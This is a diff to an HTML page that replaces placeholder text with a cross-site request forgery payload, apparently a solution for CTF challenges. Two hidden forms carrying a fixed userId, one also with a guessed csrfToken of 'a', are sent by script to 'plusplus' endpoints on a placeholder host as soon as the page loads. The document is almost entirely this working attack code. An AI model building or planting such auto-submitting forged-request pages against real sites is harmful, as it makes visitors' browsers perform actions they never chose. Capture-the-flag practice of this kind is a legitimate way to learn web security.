@@ -1,7 +1,21 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Hello World</h1>
-<p>Test Test</p>
+<h1>The Content of this page is for educational CTF assignment use only</h1>
+<form id="completeChallenge2" action="http://hostname:port/user/csrfchallengetwo/plusplus" method="POST" >
+<input type="hidden" name="userId" value="a6a3d629e38d1c51ac6a8d3b61df132eb78279c8" />
+<input type="submit"/>
+</form>
+<script>
+document.forms["completeChallenge2"].submit();
+</script>
+<form id="completeChallenge3" action="http://hostname:port/user/csrfchallengethree/plusplus" method="POST" >
+<input type="hidden" name="userId" value="a6a3d629e38d1c51ac6a8d3b61df132eb78279c8" />
+<input type="hidden" name="csrfToken" value="a" />
+<input type="submit"/>
+</form>
+<script>
+document.forms["completeChallenge3"].submit();
+</script>
 </body>
 </html>
